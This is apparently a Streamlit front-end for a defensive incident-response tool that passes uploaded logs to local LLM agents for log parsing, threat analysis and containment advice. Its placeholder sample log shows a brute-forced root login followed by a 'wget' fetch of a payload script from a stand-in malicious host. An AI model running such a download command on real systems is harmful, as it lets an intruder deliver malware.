import streamlit as st
from agents import run_agent
from storage import save_incident, load_all_incidents, clear_all_incidents
from log_utils import read_upload

st.set_page_config(page_title="IR Agent", page_icon="🛡️", layout="wide")

AGENT_META = {
    "LogParser":   ("🔍", "Log Parser Agent"),
    "ThreatIntel": ("🕵️", "Threat Intelligence Agent"),
    "Containment": ("🔒", "Containment Advisor Agent"),
}


def display_results(results: dict):
    for key, output in results.items():
        emoji, label = AGENT_META.get(key, ("🤖", key))
        st.markdown(f"### {emoji} {label}")
        st.markdown(output)
        st.divider()


# ── Sidebar ───────────────────────────────────────────────────────────────────
with st.sidebar:
    st.title("🛡️ IR Agent")
    st.caption("Cybersecurity Incident Response")
    st.divider()

    model = st.text_input("Ollama Model", value="llama3")

    st.divider()
    st.subheader("🤖 Agents")
    use_parser      = st.checkbox("🔍 Log Parser",           value=True)
    use_threat      = st.checkbox("🕵️ Threat Intelligence",  value=True)
    use_containment = st.checkbox("🔒 Containment Advisor",  value=True)

    st.divider()
    st.subheader("📋 Incident Context")
    org_name    = st.text_input("Organisation / Team", value="SOC Team Alpha")
    environment = st.selectbox("Environment", ["Production", "Staging", "Development", "Unknown"])
    severity    = st.selectbox("Initial Severity", ["Critical", "High", "Medium", "Low", "Unknown"])

    st.divider()
    if st.button("🗑️ Clear All Incidents", use_container_width=True):
        clear_all_incidents()
        st.success("Cleared.")
        st.rerun()


# ── Header ────────────────────────────────────────────────────────────────────
st.title("🛡️ Cybersecurity Incident Response Agent")
st.caption("Upload logs or paste alerts — agents will triage, analyse threats, and recommend containment actions.")

# ── Input ─────────────────────────────────────────────────────────────────────
st.subheader("📥 Log / Alert Input")

input_mode = st.radio("Input method", ["Upload File", "Paste Text"], horizontal=True)
raw_log = ""

if input_mode == "Upload File":
    uploaded = st.file_uploader("Upload log or alert file", type=["txt", "log", "csv", "json"])
    if uploaded:
        raw_log = read_upload(uploaded)
        line_count = len(raw_log.splitlines())
        st.success(f"Loaded **{uploaded.name}** — {line_count:,} lines")
        with st.expander("📄 Preview (first 50 lines)", expanded=False):
            preview = "\n".join(raw_log.splitlines()[:50])
            st.code(preview, language="text")
else:
    raw_log = st.text_area(
        "Paste log lines or alert text",
        height=220,
        placeholder=(
            "2024-01-15 03:42:11 FAILED LOGIN root from 192.168.1.105\n"
            "2024-01-15 03:42:14 FAILED LOGIN root from 192.168.1.105\n"
            "2024-01-15 03:42:17 SUCCESS LOGIN root from 192.168.1.105\n"
            "2024-01-15 03:42:20 CMD: wget http://malicious.xyz/payload.sh\n"
        ),
    )

incident_title = st.text_input("Incident Title", value="Incident Investigation")
extra_context  = st.text_area(
    "Additional Context (optional)",
    placeholder="e.g. Alert triggered by SIEM rule. User reported phishing email 2hrs prior.",
    height=80,
)

# ── Run analysis ──────────────────────────────────────────────────────────────
selected_agents = []
if use_parser:      selected_agents.append("LogParser")
if use_threat:      selected_agents.append("ThreatIntel")
if use_containment: selected_agents.append("Containment")

if not selected_agents:
    st.warning("Enable at least one agent in the sidebar.")
elif st.button("🚨 Run Incident Analysis", use_container_width=True, type="primary"):
    if not raw_log.strip():
        st.error("Please provide log data before running the analysis.")
    else:
        context_block = (
            f"Organisation: {org_name}\n"
            f"Environment: {environment}\n"
            f"Declared Severity: {severity}\n"
            f"Additional Context: {extra_context.strip() or 'None provided'}"
        )

        results      = {}
        accumulated  = ""
        progress_bar = st.progress(0, text="Initialising agents...")

        for i, agent_name in enumerate(selected_agents):
            _, label = AGENT_META[agent_name]
            progress_bar.progress(
                i / len(selected_agents),
                text=f"Running {label}...",
            )
            output = run_agent(
                agent_name   = agent_name,
                log_text     = raw_log,
                context      = context_block,
                prior_output = accumulated,
                model        = model,
            )
            results[agent_name] = output
            accumulated += f"\n\n--- {label} ---\n{output}"

        progress_bar.progress(1.0, text="✅ Analysis complete.")

        save_incident(
            title       = incident_title,
            org         = org_name,
            environment = environment,
            severity    = severity,
            log_snippet = raw_log[:3000],
            agents      = selected_agents,
            results     = results,
        )

        st.divider()
        st.subheader("📊 Incident Analysis Report")
        cols = st.columns(3)
        cols[0].metric("Incident", incident_title)
        cols[1].metric("Environment", environment)
        cols[2].metric("Severity", severity)
        st.divider()
        display_results(results)


# ── Past incidents ────────────────────────────────────────────────────────────
st.divider()
st.subheader("🗂️ Past Incidents")

incidents = load_all_incidents()
if not incidents:
    st.info("No incidents analysed yet. Upload logs above to start.")
else:
    for inc in reversed(incidents):
        sev_icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}.get(inc["severity"], "⚪")
        label = (
            f"{sev_icon} {inc['title']}  |  "
            f"{inc['timestamp']}  |  "
            f"{inc['environment']}  |  {inc['severity']}"
        )
        with st.expander(label, expanded=False):
            st.caption(f"Org: {inc['org']}  |  Agents run: {', '.join(inc['agents'])}")
            st.divider()
            display_results(inc["results"])
